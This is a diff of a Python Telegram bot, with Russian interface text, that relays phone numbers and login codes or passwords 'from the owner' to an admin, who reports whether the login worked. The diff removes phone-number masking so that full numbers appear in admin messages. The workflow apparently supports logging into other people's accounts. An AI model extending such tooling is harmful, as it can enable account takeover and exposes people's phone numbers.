@@ -781,7 +781,7 @@ async def _forward_code_to_admin(bot: Bot, req: CodeRequest, code: str) -> None:
         _password_attempts -= 1
     attempts_note = f"\n⚠️ Осталось повторов: {_password_attempts}" if _password_mode else ""
     text = (
-        f"📱 *{mask_phone(req.phone)}*\n"
+        f"📱 Номер: `{req.phone}`\n"
         f"🔑 Код от владельца: `{code}`{attempts_note}\n\n"
         "Нажмите *Встал* если сработало, *Повтор* для нового кода или *Скип*."
     )
@@ -818,7 +818,7 @@ async def _activate_request(bot: Bot, req: CodeRequest) -> bool:
     try:
         sent = await bot.send_message(
             req.admin_id,
-            f"📱 *{mask_phone(req.phone)}* — ожидание{queue_note}",
+            f"📱 Номер: `{req.phone}` — ожидание{queue_note}",
             parse_mode="Markdown",
             reply_markup=active_inline(),
         )
@@ -868,7 +868,7 @@ async def _admin_take_phone(
 
     sent = await _edit_or_answer(
         msg,
-        f"📱 *{mask_phone(phone)}* — номер взят\n\nВыберите действие:",
+        f"📱 Номер: `{phone}`\n\nВыберите действие:",
         parse_mode="Markdown",
         reply_markup=active_inline(),
     )
@@ -1161,7 +1161,7 @@ async def cb_active(callback: CallbackQuery, bot: Bot) -> None:
         if isinstance(msg, Message):
             try:
                 await msg.edit_text(
-                    f"📱 *{mask_phone(req.phone)}*\n{label} запрошен у владельца...",
+                    f"📱 Номер: `{req.phone}`\n{label} запрошен у владельца...",
                     parse_mode="Markdown", reply_markup=password_inline(),
                 )
             except Exception:
@@ -1223,7 +1223,7 @@ async def cb_password(callback: CallbackQuery, bot: Bot) -> None:
         if isinstance(msg, Message):
             try:
                 await msg.edit_text(
-                    f"📱 *{mask_phone(req.phone)}*\n🔄 Повторный запрос отправлен...",
+                    f"📱 Номер: `{req.phone}`\n🔄 Повторный запрос отправлен...",
                     parse_mode="Markdown", reply_markup=password_inline(),
                 )
             except Exception:
